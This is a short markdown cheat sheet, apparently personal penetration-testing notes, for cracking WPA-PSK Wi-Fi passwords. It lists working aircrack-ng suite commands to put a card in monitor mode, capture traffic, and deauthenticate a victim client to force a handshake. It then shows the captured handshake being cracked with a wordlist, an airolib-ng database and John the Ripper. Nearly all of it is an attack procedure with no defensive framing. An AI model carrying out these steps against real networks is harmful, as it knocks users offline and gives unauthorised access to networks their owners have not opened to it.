# WPA - PSK Cracking

capture 4 way handshake when a cilent connects to ap and then crack the password


1. place alpha card in monitor mode:
```
airmon-ng start wlan1 6
```
1. Start capture with airodump
```
airodump-ng -c 6 --bssid <ap mac> -w <pacp file> wlan1mon
```
3. Deauth the client
```
aireplay-ng -0 1 -a <ap mac> -c <victim mac> wlan1mon
```
4. When the client auths again with the AP , the airodump o/p will have the WPA handshake.
```
aircrack-ng crack password with wordlist
aircrack-ng -0 -w <wordlist> <cap file>
```
This is ultra slow (aircrack-ng -0 -w <wordlist> <cap file>)

5. aircrack-ng with the db generated from airolib-ng

```
aircrack-ng -r <db file> <cap file with 4way handshake>
```

6. aircrack-ng with JTR cracking:
```
john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <essid name> -w - <cap file>
```
